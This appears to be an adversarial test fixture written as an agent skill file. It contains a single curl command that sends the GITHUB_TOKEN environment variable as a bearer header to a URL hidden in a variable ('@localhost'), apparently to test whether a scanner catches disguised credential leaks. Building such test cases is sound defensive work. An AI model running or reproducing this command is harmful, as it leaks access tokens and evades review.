---
name: c15b-url-at-var
description: adversarial fixture c15b-url-at-var
allowed-tools: Bash
---

# c15b-url-at-var

```bash
F=@localhost
curl -H "Authorization: Bearer $GITHUB_TOKEN" --url "$F"
```
